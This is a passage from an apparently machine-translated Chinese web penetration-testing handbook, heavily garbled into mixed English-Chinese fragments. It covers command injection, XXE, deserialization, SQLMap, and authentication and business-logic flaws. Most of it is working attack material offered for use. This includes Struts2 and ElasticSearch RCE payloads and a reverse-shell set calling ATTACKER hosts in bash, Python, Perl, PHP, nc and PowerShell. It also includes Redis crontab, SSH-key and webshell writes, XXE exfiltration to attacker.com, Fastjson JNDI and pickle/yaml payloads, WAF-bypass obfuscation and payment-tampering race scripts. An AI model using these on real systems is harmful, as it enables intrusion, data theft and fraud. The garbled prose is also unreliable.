Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',123*123)}.multipart/form-data
```

**Struts2 OGNLgeneral/universalcommandExecute**：

```
${(#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('whoami').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}
```

**ElasticSearch Groovysandboxbypass**：

```json
{"size":1,"script_fields":{"x":{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
```

**RedisunauthorizedwriteSSHPublic Key/Crontab**：

```bash
redis-cli -h target
config set dir /root/.ssh && config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAA...\n\n" && save
# orwritecrontab
config set dir /var/spool/cron && config set dbfilename root
set x "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker/8080 0>&1\n\n" && save
```

#### ReverseShellSet

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/PORT 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'

# Perl
perl -e 'use Socket;$i="ATTACKER";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# PHP
php -r '$sock=fsockopen("ATTACKER",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# NCno/without-eparameter
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER PORT >/tmp/f

# PowerShell (Windows)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER",PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}
```

#### PHPdanger险functionhierarchy level

| hierarchy level | function | can力 |
|-----|------|-----|
| L1codelevel/grade | `eval()`, `assert()(PHP5)`, `create_function()`, `preg_replace(/e)` | PHPcodeExecute |
| L2 Shelllevel/grade | `system()`, `passthru()`, `shell_exec()`, negative/reverselead/guidenumber | systemcommandhas/havereturnshow/display |
| L3Processlevel/grade | `exec()`, `popen()`, `proc_open()`, `pcntl_exec()` | 子ProcessExecute |
| L4return调level/grade | `call_user_func()`, `array_map()` | betweenreceive/connectfunctioncall/invoke |

#### PHP WAFbypasstip/trick

```php
// stringjoinreceive/connect
$func = 'sys'.'tem'; $func('whoami');
// variablefunction
$a='sys';$b='tem';($a.$b)('whoami');
// EncodingObfuscation
base64_decode('c3lzdGVt')           // system
str_rot13('flfgrz')                 // system
chr(115).chr(121).chr(115).chr(116).chr(101).chr(109) // system
// stringoperation
strrev('metsys')('whoami');
implode('',array('s','y','s','t','e','m'))('whoami');
```

#### disable_functionsbypass

| method | original principle/logic | condition |
|-----|------|-----|
| LD_PRELOAD | HijacksystemLibraryfunction，mail()triggerLoadmalicious.so | canUpload.so + mail()can use |
| Shellshock | Bash<=4.3environmentvariableInject | old版Bash |
| Apache Mod_CGI | .htaccessconfigurationCGIExecute | Apache + AllowOverride |
| PHP-FPM/FastCGI | ModifyPHPconfigurationExecutecode | canAccessFPMPort/SSRF |
| ImageMagick | delegatemeritcancommandExecute | useIMprocess/handleGraph (classifier) |
| Windows COM | WScript.ShellComponent | Windows + COMExtension |

**LD_PRELOADcoreexploit**：

```php
// Uploadmalicious.so（Hijackgeteuidfunction，Internalcall/invokesystem()）
putenv("LD_PRELOAD=/tmp/exploit.so");
mail("a@a.com","test","test");  // mail()StartsendmailProcess -> Load.so -> Executecommand
```

### 3.5 defensemeasure

```php
// Best Practice：白 namesingleValidate + escapeshellarg
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    system("ping " . escapeshellarg($_GET['ip']));
}
```

- Avoiddirectreceive/connectcall/invokesystemcommand，use language speech/languageinner/insideplacefunction替generation/proxy
- parameter-izeExecute（Arraytransmit参），Prohibitstringjoinreceive/connect
- `escapeshellarg()` + `escapeshellcmd()` Escape
- 白 namesingleValidateinputenter + typeInspect/Check
- `disable_functions` Disabledanger险function（Notebypassrisk）
- mostsmallPermissionRunWebService + container/chrootisolation
- timelyUpdateFrameworkComponent（Struts2/WebLogic/ImageMagicketc.）

---

## four、XXE (XML External EntityInject)

### 4.1 vulnerabilitythis质

```
XMLinputenter -> parser/resolverEnableDTD/Externalsolidbody -> solidbodycitationby (passive)parsingExecute -> FileRead/SSRF/RCE
```

**core公 style/mode**：XXE = XMLparser/resolverallowsExternalsolidbodycitation + usercancontrolXMLinputenter

### 4.2 detectionmethod

**highdangerentry pointidentify**

| enter口type | detectionspecial征 | 典 typescenario |
|----------|----------|----------|
| APIinterface | Content-Typecontain/include`text/xml`or`application/xml` | RESTful API、SOAP WebService |
| FileUpload | SVGGraph (classifier)、DOCX/XLSX/PPTX(this质ZIPcontain/includeXML) | head/top像Upload、documentImport |
| dataparsing | XMLconfigurationImport、RSS/Atomsubscribe |  after/back (classifier for machines)manage、Aggregatemeritcan |
| Protocolinteractive | SAMLAuthentication、WebDAV、XMPP | SSOlogin、Filemanage |

**fastspeed/fastdetectionprocess**

```
1. identifyXMLprocess/handleinterface → ModifyContent-Typefor/isapplication/xmlTest
2. Sendfoundation/basisDTDdeclare → observeisno/notparsing(报wrongdifference)
3. attemptExternalsolidbodycitation → fileProtocolReadKnownFile
4. no/withoutreturnshow/displaytime → OOBoutbring/carry(DNS/HTTPreturn连)
```

### 4.3 经典Payload

#### FileRead（has/havereturnshow/display）

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

#### SSRFintranet/internal networkdetect/probe

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal:8080/">]>
<foo>&xxe;</foo>

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>
```

#### Blind Injection - OOBoutbring/carrydata

```xml
<!-- ExternalDTD (attackerServerhostevil.dtd) -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>

<!-- evil.dtdcontent: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

#### 报wrongreturnshow/display

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % error "<!ENTITY &#x25; e SYSTEM 'file:///nonexistent/%file;'>">
  %error;
  %e;
]>
```

### 4.4 bypasstip/trick

| bypassway/manner | method | 适 usescenario |
|----------|------|----------|
| Encodingbypass | UTF-16BE/LE、UTF-7EncodingXML | WAFbased onASCIIpatternMatch |
| parametersolidbody嵌set | `%entity;`替generation/proxy`&entity;` | Filtergeneral/universalsolidbody`&` |
| XInclude | `<xi:include href="file:///etc/passwd"/>` | cannotcontrolDOCTYPEdeclare |
| SVG嵌enter | SVGFileinner/inside嵌XXEsolidbody | onlyallowsGraph (classifier)Upload |
| DOCX/XLSX嵌enter | ModifyOfficedocumentinner/inside`[Content_Types].xml` | documentUploadmeritcan |
| CDATAPackage裹 |  useCDATA paragraph/segmentbypassspecialcharacterlimitation | Readcontain/includeXMLspecialcharacter's/ofFile |

### 4.5 defensemeasure

```java
// Java: DisableDTDandExternalsolidbody
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

- DisableDTDprocess/handleandExternalsolidbodyparsing（preferred）
- useJSON替generation/proxyXMLadvancerowdataswap
- inputenter白 namesinglevalidate、UpgradeXMLparsingLibrary
- WAFruleIntercept`<!DOCTYPE`/`<!ENTITY`/`SYSTEM` close/shutkeyword

---

## five、Deserialization Vulnerability

### 5.1 vulnerabilitythis质

```
Serializationdata(notcanmessage) -> Deserializationfunction ->  for/to象 re-/heavyconstructtrigger魔术method/return调 -> maliciouslogicExecute
```

**core公 style/mode**：DeserializationRCE = cancontrolSerializationinputenter + danger险 category/classat/inclasspath/effect/functiondomaininner/inside + canreach's/ofexploitchain(Gadget Chain)

### 5.2 JavaDeserialization

**detectionidentifier**

```
BinaryStream: AC ED 00 05 (hexheader)
Base64:   rO0AB (Encoding after/backheader)
commonlocation: Cookie、ViewState、JMX、RMI、T3Protocol、HTTP Body
```

**exploitchainquick reference**

| exploitchain | depend onLibrary | triggerway/manner | tool |
|--------|--------|----------|------|
| Commons-Collections | commons-collections 3.x/4.x | InvokerTransformer | ysoserial |
| Spring | spring-core + spring-beans | MethodInvokeTypeProvider | ysoserial |
| Fastjson | fastjson < 1.2.68 | `@type` autoType | 手工/专 usetool |
| Jackson | jackson-databind | multi/multiple态Deserialization | ysoserial |
| JNDIInject | JDK < 8u191 | LDAP/RMIRemote category/classLoad | JNDIExploit/marshalsec |

**Fastjson经典Payload**

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}

// 1.2.47 cachebypass
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/","autoCommit":true}}
```

**toolchain**

```bash
# ysoserialgeneratepayload
java -jar ysoserial.jar CommonsCollections1 "whoami" | base64

# JNDIInjectService
java -jar JNDIExploit.jar -i attacker_ip

# marshalsecStartmaliciousLDAP/RMI
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker/#Exploit"
```

### 5.3 PHPDeserialization

**detectionidentifier**

```
format: O:4:"User":2:{s:4:"name";s:5:"admin";s:3:"age";i:25;}
 close/shutkeyfunction: unserialize(), phar://Protocoltrigger
```

**魔术methodexploitchain**

| method | triggertimemachine | exploitway/manner |
|------|----------|----------|
| `__wakeup()` | unserialize()call/invoketime | attribute覆stamp→danger险operation |
| `__destruct()` |  for/to象Destroytime | FileDelete/Write/commandExecute |
| `__toString()` |  for/to象by (passive)whenstringuse | joinreceive/connectadvancedanger险function |
| `__call()` | call/invokenotexistat/in's/ofmethod | chain style/modecall/invokejump板 |

**POPchainconstructway of thinking**

```
1. 找enter口: __wakeup()/__destruct() middle/centercall/invoke$this->xxxattribute's/ofmethod
2. jump板: via/through__toString()/__call()/__get() linked toother category/class
3.  endpoint:  toreachsystem()/eval()/file_put_contents()etc.danger险function
4. construct: controlattributevalue makechain路 completewhole/integer连common
```

**PharDeserialization（no/without需unserializecall/invoke）**

```php
// Fileoperationfunctiontriggerphar://Deserialization
file_exists('phar://upload/evil.phar');
is_dir('phar://upload/evil.jpg');      // disguise/masqueradefor/isGraph (classifier) after/back缀
```

### 5.4 PythonDeserialization

**danger险function**

```python
import pickle, yaml, marshal

# pickle - mostcommon
pickle.loads(data)      # Deserialization
pickle.load(file)       #  fromFileDeserialization

# yaml - needLoader
yaml.load(data)         # defaultinsecure(oldversion)
yaml.load(data, Loader=yaml.FullLoader)  # limitationLoad

# marshal - Bytecodelevel
marshal.loads(data)     # Loadcode for/to象
```

**pickle RCE Payload**

```python
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())
# etc.price手工construct:
# pickle.loads(b"cos\nsystem\n(S'whoami'\ntR.")
```

**yaml RCE Payload**

```yaml
!!python/object/apply:os.system ['whoami']
# or
!!python/object/new:subprocess.check_output [['whoami']]
```

### 5.5 defensemeasure

```java
// Java: ObjectInputStream白 namesingleFilter
ObjectInputStream ois = new ObjectInputStream(input) {
    @Override protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        if (!allowedClasses.contains(desc.getName())) throw new InvalidClassException("Blocked: " + desc.getName());
        return super.resolveClass(desc);
    }
};
```

- **Java**: UpgradeComponent(Fastjson/Jackson/Commons-Collections)、Disable/OffautoType、use白 namesingleDeserializationfilter
- **PHP**: Avoidunserialize()process/handleuserinputenter、usejson_decode替generation/proxy、Disablephar://Protocol
- **Python**: use`yaml.safe_load()`替generation/proxy`yaml.load()`、Prohibitpickleprocess/handlenotcanmessagedata、useJSON
- **general/universal**: Avoidoriginalgenerate/liveSerializationformattransmitinputdata，统oneuseJSON； for/toDeserializationenter口 doSignature/HMACvalidate

---

## appendix：SQLMapquick reference

```bash
# foundation/basisdetection
sqlmap -u "http://t/p.php?id=1" --batch
# POSTrequest
sqlmap -u "http://t/login.php" --data="user=t&pass=t" --batch
# Cookie/HTTPhead/topInject
sqlmap -u "http://t/p.php" --cookie="id=1" --level=2 --batch
sqlmap -u "http://t/p.php" --headers="X-Forwarded-For: 1" --level=3 --batch
# bypassWAF
sqlmap -u "http://t/p.php?id=1" --tamper=space2comment,between --batch
# dataextractchain
sqlmap ... --dbs
sqlmap ... -D db --tables
sqlmap ... -D db -T tbl --columns
sqlmap ... -D db -T tbl -C c1,c2 --dump
```

## References — web-logic-auth

# Weblogicand/withAuthenticationsecurity

> **comeSource**: based onWooYunvulnerabilityLibrary88,636 (counter)truesolidvulnerabilityrefine，覆stamplogicdefect/flaw(8,292 (counter))and/withUnauthorized Access(14,377 (counter))两large category/class
> ** use途**: Webshould usesecurityTestmiddle/centerlogicvulnerabilityand/withAuthenticationbypass's/ofsolid战referencemanual

---

## one、exceedrightvulnerability

### 1.1 vulnerabilitythis质

exceedrightvulnerability's/of (classifier) becauseis**Authorizationvalidateabsentornot completewhole/integer**——Serviceend(side)un-at/inevery next/timeresourceSourceoperationtimeValidaterequest者isno/not具has/havecorresponds toPermission。

| type | define |  (classifier) because | Risk Level |
|------|------|------|----------|
| Horizontal Privilege Escalation | same/togetherlevel/gradeuserbetweenexceedboundaryAccess | un-validateresourceSourcereturn/belongbelong | high |
| Vertical Privilege Escalation | lowPermissionExecutehighPermissionoperation | un-validaterolePermission | 严 re-/heavy |

### 1.2 Horizontal Privilege Escalation(IDOR)

**high频scenarioand/withexploitway/manner**:

```
scenario1: IDtraverse/iterate——自increaseIDleads tocanpredict
GET /address/edit/?addid=100001  → 自己's/ofaddress
GET /address/edit/?addid=100002  → other人's/ofaddress(exceedright)

scenario2: resourceSourceReplaceattack——Modifyoperationmissingplacehas/haverightValidate
accountACreatesend/issue票ID=1001 → accountBModifytimeReplaceID=1001 → A's/ofsend/issue票by (passive)覆stamp

scenario3: APIparametertraverse/iterate——interfaceonlyValidateloginnotValidatePermission
/personal/center/family/{id}/edit → ReplaceidLeak/Disclosureother人information
```

**Testmethod**:
1. grab/capturePackageLog/Recordnormalrequestmiddle/center's/ofIDparameter(uid/orderId/addidetc.)
2. Replacefor/isotheruser's/ofID，observeresponse
3. Automatic-izetraverse/iterate(Burp Intruderorfootthis)
4.  close/shutnoteincrease删改查four category/classoperation，ModifyandDeleteharmmostlarge

```python
# IDORAutomatic-izedetectionway of thinking
def idor_test(base_url, param_name, id_range, session_cookie):
    for id in range(id_range[0], id_range[1]):
        resp = requests.get(
            f"{base_url}?{param_name}={id}",
            cookies={"session": session_cookie}
        )
        if resp.status_code == 200 and "Sensitivedataspecial征" in resp.text:
            print(f"[!] IDOR: {param_name}={id}")
```

**exceedrightTestmatrix**:

| operationtype | Testmethod | Risk Level |
|----------|----------|----------|
| view | ReplaceresourceSourceID | middle/center |
| Modify | ReplaceresourceSourceID+data | high |
| Delete | ReplaceresourceSourceID | 严 re-/heavy |
| Create | Replacereturn/belongbelonguserID | high |

### 1.3 Vertical Privilege Escalation

**coreexploitway/manner**:

```http
# regular/normaluserModifyresource料timeTamperroleidentifier
POST /updateUser HTTP/1.1
user.aid=3&user.name=test   # aid=3 regular/normaluser

# Tamperfor/ismanagemember
POST /updateUser HTTP/1.1
user.aid=1&user.name=test   # aid=1 superlevel/grademanagemember
```

**detectionneed topoint**:
- EnumerationroleID: usually 1=super管, 2=managemember, 3+=regular/normaluser
- Testroleswitch: Modifyrequestmiddle/centerroleidentifier(role/aid/type/level)
- lowPermissionaccountdirectreceive/connectAccessmanagememberinterfaceURL
- TamperPermissionidentifier: `isAdmin=0->1`, `role=user->admin`

### 1.4 defensemeasure

- resourceSourceAccess before/frontmandatoryvalidateplacehas/haveright: `WHERE id=? AND user_id=when before/frontuser`
- useUUID替generation/proxy自increaseID，PreventEnumeration
- SensitiveoperationLog/RecordAuditLog
- implementmostsmallPermissionprinciple，Backend逐interfaceauthentication
- Permissionvalidatelogiccollectmiddle/centermanage(middle (classifier)/interceptor)

---

## two、Payment Logicvulnerability

### 2.1 vulnerabilitythis质

支付vulnerability's/ofcoreis**trustboundary/perimetererror/mistake**——will/shallpriceformat/gridcalculate/computeetc.Sensitivelogicdescend沉 toClient，Serviceend(side)un-independentvalidate。

```
securitymodule type: notcanmessagedifferencedomain(Client) -> trustboundary/perimeter -> canmessagedifferencedomain(Serviceend(side))
error/mistakeImplementation: directreceive/connectacceptsClientCommit's/ofpriceformat/grid as/dofor/is事solid依据
correct/positivecertainImplementation: ClientonlyprovideProductID，Serviceend(side)independent查pricecalculate/compute
```

### 2.2 commonscenarioand/withexploittip/trick

**scenario1: Amountdirectreceive/connectTamper**

```http
# originalrequest
POST /order/create HTTP/1.1
{"productId":"12345","quantity":1,"price":299.00}

# Tamperrequest
POST /order/create HTTP/1.1
{"productId":"12345","quantity":1,"price":0.01}
```

**scenario2: Coupon/Discountlogic滥 use**

```
1. 购买ProductA(59元)，trigger"full59换购B(5.9元)"
2. descendsingleA+B，支付64.9元
3. cancelProductA，onlykeepstay/keepB
4. actual with/by5.9元购 (complement)originalprice21元's/ofProductB

Testway of thinking: combinationOrder after/backpartial/somecancel、Couponuse after/backretreat货、积 part/point兑换 after/backRefund
```

**scenario3: virtual/empty拟货币printtake/get**
- register推broadcan获积 part/point -> brute force crackingValidatecodeBatchregister -> 积 part/point兑换solid物

**scenario4: numberquantity/measure/defeatnumberattack**
- `count=1 -> count=-1` (defeatnumberleads toRefund)
- `price=100 -> price=-100` (defeatAmount)

### 2.3 system-izeTestmethod

```
Phase 1: parameterFingerprintidentify
  - grab/capturePackageOrderCreateinterface
  - identifypriceformat/gridparameter(price/amount/total/cost/discount)
  - determinesparametertype(whole/integer type/浮point/string)

Phase 2: boundary/perimetervalueTest
  - mostsmallvalue: 0, 0.01
  - defeatnumber: -1, -100, -0.01
  - format: 科学plannumber method/law(1e-10), JSON嵌set
  - 精degree/measure: 浮pointOverflow, 舍entererrordifference

Phase 3: logicbypass
  - parameter冗extra: Commitmulti/multiple (counter)priceparameter
  - parameter覆stamp:  firstliftprice after/backdescendprice
  - Coupon叠add: priceformat/grid+Discountdouble re-/heavyoperate纵
  - combinationOrder after/backpartial/somecancel/retreat货

Phase 4: 支付processeach环 sectionvalidate
  - Ordergenerate -> Inspect/CheckOrderAmount
  - 支付jump转 -> Validate支付Amount
  - 支付return调 -> Forgereturn调Signature
  - Refundprocess -> Inspect/CheckRefundAmount
```

**highlevel/gradeexploittip/trick**:

```python
# priceformat/gridTamper+Concurrent竞争
import threading
def create_order():
    requests.post("/order/create", json={"price":0.01,"productId":"premium"})
threads = [threading.Thread(target=create_order) for _ in range(50)]
for t in threads: t.start()
```

```http
# parameter污染: certain/someFrameworkwill/canprocess/handle re-/heavy repeatparameter
POST /order/create?price=299.00&price=0.01

# typeconversionbypass
{"price":"0.01"}     string
{"price":1e-10}      科学plannumber method/law
{"price":null}       NULLInject
```

### 2.4 defensemeasure

```
Layer 1 Input Validation: onlyacceptsProductIDnotacceptsprice; Amountcorrect/positivenumbermostmulti/multiple2bitsmallnumber
Layer 2 业务logic: Serviceend(side)independentcalculate/computepriceformat/grid; priceformat/grid偏leave阈valuetimerejects/人工audit
Layer 3 dataintegrity: OrderSignature(HMAC)防Tamper; time戳防Replay; 幂etc.property/nature防 re-/heavy repeat
Layer 4 支付Validate: return调Amount=OrderAmount; 严format/gridstatemachine; all/fullchain路AuditLog
```

---

## three、Password Resetvulnerability

### 3.1 vulnerabilitythis质

Password Resetvulnerability's/ofthis质is**Authenticationchain (classifier)break/judge裂**——Resetprocessmiddle/centersome/certain (counter)环 sectionun-correct/positivecertainBinduserIdentity。

### 3.2 fourlargevulnerabilitypattern

**patternA: Validatecodereturnshow/displayLeak/Disclosure**

```http
POST /sendSmsCode HTTP/1.1
phone=13888888888

# responsemiddle/centerdirectreceive/connectincludes/containsValidatecode
{"code":0,"data":{"verifyCode":"123456"}}
```

detectionmethod: InterceptSendValidatecode's/ofresponsePackage，Search4-6bitnumber。

**patternB: Validatecodeand/withuseruntie/solve绑**

```
1.  use自己手machinenumbercollect/receive toValidatecodeA
2.  for/togoal/targetaccountsend/issuestart找returnPassword
3. useValidatecodeA complete become/successValidate(un-BinduserIdentity)
 (classifier) because: Validatecodeonlyvalidatehas/have效property/nature，un-validatereturn/belongbelonguser
```

**patternC: Resetstepcanskips**

```
normal: inputenteraccount -> Authentication -> ResetPassword ->  complete become/success
attack: inputenteraccount -> [skips] -> directreceive/connectAccessResetPasswordpage

Implementationway/manner:
1. AnalysisFrontendJS，找 toeachstepURL
2. directreceive/connectAccessNo.3步URL
3. F12ModifyDOM: hide/concealValidatestep，show/displayshowResetstep
```

**patternD: Credentialparametercancontrol**

```http
POST /resetPassword HTTP/1.1
username=victim&newPassword=hacked123
# vulnerability: usernamefromClient，canby (passive)Tamperfor/isanymeaning/intentuser
```

### 3.3 Testprocess

```
send/issuestartPassword Reset
  +-- grab/capturePackageAnalysisresponse -> isno/notincludes/containsValidatecode -> patternA
  +-- AnalysisValidateprocess
  |     +-- multi/multiplestep -> attemptskipsmiddlestep -> patternC
  |     +-- singlestep -> Inspect/CheckparameterBind
  |           +-- userIDcancontrol -> parameterTamper -> patternD
  |           +-- BindSession -> SessionfixedTest
  +-- Validatecodemachinemake/control
        +-- Validatecodeisno/notand/withuserBind -> patternB
        +-- Validatecodeisno/notcanbrute force(no/without频率limitation)
        +-- Validatecodeisno/nothas/havetime效property/nature
```

### 3.4 defensemeasure

- ValidatecodeBinduserSession，validatereturn/belongbelong
- Validatecodesingle next/timehas/have效+60秒 past/excessive期
- ResetTokenone next/timeproperty/natureuse，notcanpredict
- all/fullprocessServiceend(side)statevalidate，Prohibitjump步
- failure5 next/timelock，防brute force

---

## four、业务logicdefect/flaw

### 4.1 vulnerabilitythis质

业务logicdefect/flaw's/of (classifier) becausematrix:

| hierarchy level | defect/flawtype | 典 typetablepresent |
|------|----------|----------|
| 业务layer | processset upplandefect/flaw | stepcanskips、statecanForge |
| interfacelayer | parametertrust past/excessivedegree/measure | Clientvalidate、Serviceend(side)un-Validate |
| Authenticationlayer | Credentialmanagedefect/flaw | TokenLeak/Disclosure、Sessionfixed |
| Authorizationlayer | Permissionboundary/perimeterfuzzy/blur | 水平/Vertical Privilege Escalation |

### 4.2 CAPTCHA Bypass

**bypassway/manner1: ValidatecodenotRefresh**
- loginfailure after/backValidatecodenotAutomaticRefresh，same/togetheroneValidatecodecan re-/heavy repeatuse
- exploit: 手工identifyone next/time，fixedValidatecode暴力破Decryptioncode

**bypassway/manner2: Validatecodecanbrute force**
- 4-6bitpurenumber，no/without next/timenumber/频率limitation
- brute forceemptybetween10000-1000000，30Threadabout/approximately30秒 complete become/success

**bypassway/manner3: Frontendvalidate**
- Validatecodeonlyat/inFrontendJSvalidate，DeleteFrontendvalidatecodeordirectreceive/connectcall/invokeinterfacei.e.canbypass

**Validatecodesecuritydetectionclearsingle**:
- Validatecodeisno/notat/inresponsemiddle/centerLeak/Disclosure
- isno/notand/withSession/userBind
- isno/nothas/havetime效property/nature(Recommendation60秒)
- Validatefailureisno/notmandatoryRefresh
- isno/nothas/have频率limitation(Recommendation5 next/time/ part/point钟)
-  repeatmixeddegree/measureisno/notenough(Recommendation6bitword母numbermixcombine)

### 4.3 condition竞争(Race Condition)

适 usescenario: Couponuse、积 part/point兑换、Libraryexist扣subtract、Balance支付

```python
import threading, requests
def redeem():
    requests.post("/redeem", data={"points":1000, "item":"iPhone"})

# Concurrent100 next/time，attemptmulti/multiple next/time兑换same/togetherone份积 part/point
threads = [threading.Thread(target=redeem) for _ in range(100)]
for t in threads: t.start()
```

 (classifier) because: Inspect/CheckBalanceand/with扣subtractBalancenotisoriginal子operation，Concurrentdescendcanmulti/multiple next/timevia/throughInspect/Check。

### 4.4 parameterTampersystem-izemethod

| parametertype | Tamperdirection | example |
|----------|----------|------|
| userID | Replacefor/isotheruser | uid=1001->1002 |
| Amount | subtractsmall/return/belongzero/defeatnumber | price=100->0.01 |
| numberquantity/measure | defeatnumber | count=1->-1 |
| state | 翻转布尔value | isPaid=false->true |
| role | improvementPermission | role=user->admin |
| time | 延growhas/have效期 | expireTime->2099-12-31 |

### 4.5 业务processReverseAnalysis method/law

```
step1: 绘make/control completewhole/integer业务processGraph
step2: identifyeach环 section's/ofvalidatepoint
step3: assessmentvalidateisno/notcanbypass(Frontend/Backend? canReplay? parametercancontrol?)
step4: set upplanbypassTestuse case

example(Password Resetprocess):
[inputenteraccount] -> [SendValidatecode] -> [ValidateIdentity] -> [settingnewPassword]
     |              |              |              |
  accountEnumeration      ValidatecodeLeak/Disclosure      stepskips      parameterTamper
```

### 4.6 defenseprinciple

- **Serviceend(side)right威**: placehas/havevalidateat/inServiceend(side) complete become/success，Frontendvalidateonlyfor/isUX
- **original子operation**:  close/shutkey业务(扣model/version/Libraryexist)use事务+lock
- **statemachine**: 业务process严format/gridpress/according tostatemachine推advance，notcanjump步
- **防Replay**:  close/shutkeyinterface幂etc.set upplan，requestbring/carrytime戳+Signature

---

## five、Authenticationbypass

### 5.1 vulnerabilitythis质

Authenticationbypass's/ofcoreis**trustchain (classifier)by (passive)打破**: systemerror/mistake (adverbial)trust(past tense)fromnotcanmessageSource's/ofIdentitydeclare。

### 5.2 Cookie/SessionForge

```
# directreceive/connectWriteCookie获 (complement)Identity
GET /registeruser/CookInsert?userAccount=admin&inner=1
->  to/towardsCookieWriteadminIdentity，directreceive/connect获 (complement)managememberSession

# Cookiemiddle/center's/ofIdentityidentifiercanpredict
Cookie: admin=true; userId=1
-> ModifyCookievaluei.e.canswitchIdentity
```

JWTbypass:

| technique | Payload |
|------|---------|
| emptyAlgorithm | alg: none |
| weakKey | brute force crackingHS256Key |
| AlgorithmObfuscation | RS256转HS256， usePublic KeySignature |

### 5.3 responseTamperbypass

```
normal: requestValidate -> {"status":"0","msg":"Validatecodeerror/mistake"} -> stopstay/keepValidate页
attack: requestValidate -> Interceptresponse -> Modifyfor/is{"status":"1","msg":" become/successmerit"} -> enterdescendone步
```

适 usecondition: Clientaccording toresponsestatecontrolprocess+Serviceend(side) after/back续stepnot re-/heavynewValidate。

### 5.4 IPForge/Headerbypass

```http
# bypassIP白 namesingle's/ofoften useHeader
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
Host: localhost
```

### 5.5 Pathbypass

```
# largesmallwriteObfuscation
/ADMIN/  /Admin/  /aDmIn/

# URLEncodingbypass
%2e%2e%2f = ../
%252e%252e%252f = ../ (double re-/heavyEncoding)

# emptybyte截break/judge
../../../etc/passwd%00.jpg

# Add after/back缀bypass
/admin -> /admin/  /admin;.js  /admin%23
```

### 5.6  after/back (classifier for machines)Unauthorized Access

high频unauthorizedPath:

```
# Webmiddle (classifier)
/console/              (WebLogic)
/manager/html          (Tomcat)
/jmx-console/          (JBoss)
/actuator/env          (Spring Boot)
/actuator/heapdump     (Spring Boot, canLeak/DisclosurePassword)

# APIinterface
/swagger-ui.html       (APIdocument)
/api-docs              (APIdocument)
/api/configs           (configurationLeak/Disclosure)

# Debug/manage
/admin/index.jsp
/phpMyAdmin/
/druid/index.html      (DruidMonitor)
```

middle (classifier)weak口 makequick reference:

| middle (classifier) | commonweak口 make |
|--------|-----------|
| Tomcat | admin:admin, tomcat:tomcat |
| WebLogic | weblogic:weblogic, weblogic:12345678 |
| JBoss | admin:admin(orno/withoutAuthentication) |

### 5.7 Database/Serviceunauthorized

| Service | Port | Validatecommand | exploitway/manner |
|------|------|----------|----------|
| Redis | 6379 | redis-cli -h IP info | writeSSHPublic Key/Webshell/planTask |
| MongoDB | 27017 | mongo IP:27017 | no/withoutAuthenticationdirect连，Exportalldata |
| Elasticsearch | 9200 | curl IP:9200/_cat/indices | Readindexdata |
| Memcached | 11211 | echo stats, nc IP 11211 | dataLeak/Disclosure |
| Docker API | 2375 | curl IP:2375/info | containerescape/evasion/RCE |

Redisunauthorizedexploitchain(highdanger):

```bash
redis-cli -h target
# writeSSHPublic Key
config set dir /root/.ssh/
config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAA...\n\n"
save

# writeWebshell
config set dir /var/www/html/
config set dbfilename shell.php
set x "<?php system($_GET['c']);?>"
save
```

### 5.8 Sessionbypass

```
# Session IDLeak/Disclosure(Log/URL)
/logs/ctp.log -> includes/containsSession ID -> directreceive/connectuse

# Sessionfixedattack
mandatoryuseruseAttacker指define's/ofSession ID

# Sessionpredict
